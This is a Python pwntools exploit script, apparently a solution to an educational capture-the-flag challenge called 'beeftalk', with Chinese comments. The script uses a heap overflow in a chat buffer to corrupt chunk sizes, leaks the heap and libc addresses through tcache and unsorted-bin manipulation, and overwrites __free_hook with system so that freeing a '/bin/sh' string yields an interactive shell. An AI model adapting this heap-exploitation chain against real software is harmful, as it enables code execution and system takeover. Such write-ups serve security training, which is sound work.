from pwn import *
from utils import *


context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']



r= remote("edu-ctf.zoolab.org", 30207)

# r = process("./beeftalk")

'''
-----------------------------------------------
目標: get heap base address
方法：
首先觀察可以發現signup裡面初始化的部份, 除了name都是readstr,都會放null在字串後面
所以如果我們想利用malloc得到的chunk來leak heap address,只有name能用
但是name超過0x20的話想要多大的chunk就要寫入多少個A,基本上就會把我們要的heap address都給蓋掉
所以我們只能使用0x30 chunk size,我們想要讓User的這個chunk的size變成0x30(因為free掉之後會有許多address殘留在上面,
name,desc,job,fifo0,fifo1)
然後新增user2讓user2->name是0x20的size,所以會取得user1,user2->name = user1
user2->name寫入0x10個A,
此時user1就會變成 AAAAAAAAAAAAAAAA_address_of_user1_desc
在讓user2 print出name 就行了
-----------------------------------------------
purpose: 我們想要讓一塊allocated的User的size被改成0x30,在free掉,讓這塊User之後可以被其他User可以用
user->name = malloc(0x20) 的方式取得

方法：用heap overflow來改： 觀察 line 240可以發現chat_buf有heap overflow
可以拿來改chat_buf的下面那塊chunk的size
'''
# 先創出一塊0x110大小的chunk,讓chat_buf之後可以取得這塊,改這一快下面的chunk
tok1,_ = signup(r,b"A"*0x100,keep = "y")

# 這塊就是要被改的user
tok2,_ = signup(r,b"A"*0x3,keep = "y")
tok3,_ = signup(r,b"A"*0x100,keep = "y")
# free掉,使之後chat_buf可以取得
delete_account(r,tok1)

# 這個是負責去寫chat_buf的user, 因為chat_buf會先把user->name copy近來
# 如果想要達到heap overflow,就要user->name是0x100個A先把chat_buf填滿
# 之後就可以填入要overflow的值,overflow的值會是要送的message copy進chat_buf,如下
# 把tok2的user chunk size改成0x31

chat_client(r,tok3,b"B"*6 + p64(0x31))

# 此時free tok2會讓tok2的user 跑進0x31的tacache
delete_account(r,tok2)

# 新增user,他的name就是上面tok2的user,我們要leak出job address所以寫入寫入0x10個A,這樣就會print出username 成功得到heap

tok4,userInfo = signup(r,b"A"*0x10,keep = "y")
heap = userInfo.split(b'\n')[1][-6:].ljust(8,b"\x00")
heap = u64(heap) - 0x5a0
print("heap:",hex(heap))


"""
purpose:leak出libc
因為我們最多只能malloc出0x110的chunk size,所以我們無法直接alloc出0x420的chunk
讓它進入unsorted bin,所以我們以塞報tcache的形式,讓有些chunk進入smallbin
不過我們下面塞完之後發現有些跑到unsorted bin 了,反正上面會有libc的address就好
-------------------------------
"""
# 這邊delete是因為接下來要塞入多個user
delete_account(r,tok3)
# delete_account(r,tok4)

# get libc    
tokenList = []
for i in range(7):
    token,_ = signup(r,b"A"*0x100,keep = "y")
    tokenList.append(token)
for i in range(7):
    delete_account(r,tokenList[i]) 

# token_controlled = tokenList[0]

# chat_client(r,token_controller)
# controller->Desc = controlled 
controller_token,_ = signup(r,b"A"*40,keep = "y") # users[1]
controlled_token = tokenList[2] # users[3]
# 修改controlled 的name成unsorted bin裡面有libc位置的address
update_user(r,controller_token,Desc= p64(heap+0xcf8)[:-1])
# login 可以print出name
text = login_doNothing(r,controlled_token)
libc = text.split(b'\n')[1][6:6+6].ljust(8,b"\x00")
print("libc:",libc)
offset =  0x7ff445332be0 - 0x7ff445147000 
libc = u64(libc) - offset
print("libc:",hex(libc))


#### free hook
_system = libc + 0x55410
__free_hook = libc + 0x1eeb28

update_user(r,controller_token,Name = b'/bin/sh\x00', Desc = p64(__free_hook) + p64(heap+0xb90)[:-1]) 

update_user(r,controlled_token,Name = p64(_system)) 
delete_account(r,controller_token)

# chat
# signup(b"A",keep = "n")
# signup(b"dummy",keep = "y")
# token = signup(b"user1",keep = "y")


r.interactive()

    



# login()

# token = signup(b"A"*0x410,b"dummy",b"dummy")


